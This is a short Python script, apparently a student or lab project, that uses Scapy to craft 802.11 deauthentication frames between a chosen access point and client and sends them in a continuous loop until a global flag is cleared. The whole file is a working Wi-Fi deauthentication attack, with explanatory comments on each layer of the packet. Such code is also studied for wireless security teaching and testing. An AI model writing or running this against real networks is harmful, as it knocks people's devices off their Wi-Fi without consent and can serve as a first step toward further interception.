from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


def deauth_initial(bool):
    global flag
    flag = bool


def start(interface, ap, device):
    """
    RadioTap()/Dot11(...)/Dot11Deauth()
    addr1: destination MAC address
    addr2: source MAC address
    addr3: BSSID - AP MAC address
    RadioTap is making it easier to transmit information between OSI layers
    Dot11 represent the MAC header in the Data Link Layer, it is the abbreviated specification name 802.11
    Dot11Deauth represent deauthentication packet
    / - operator that used as a composition operator between two layers
    """

    # Deauthentication packet from AP to device.
    pkt_to_c = RadioTap() / Dot11(addr1=device, addr2=ap, addr3=ap) / Dot11Deauth()

    # Deauthentication packet from device to AP.
    pkt_to_ap = RadioTap() / Dot11(addr1=ap, addr2=device, addr3=ap) / Dot11Deauth()

    while flag:
        # The sendp() function send packets at layer 2 - Data Link Layer
        # Sending deauthentication packet from AP to device.
        sendp(pkt_to_c, iface=interface, verbose=0)
        # Sending deauthentication packet from device to AP.
        sendp(pkt_to_ap, iface=interface, verbose=0)
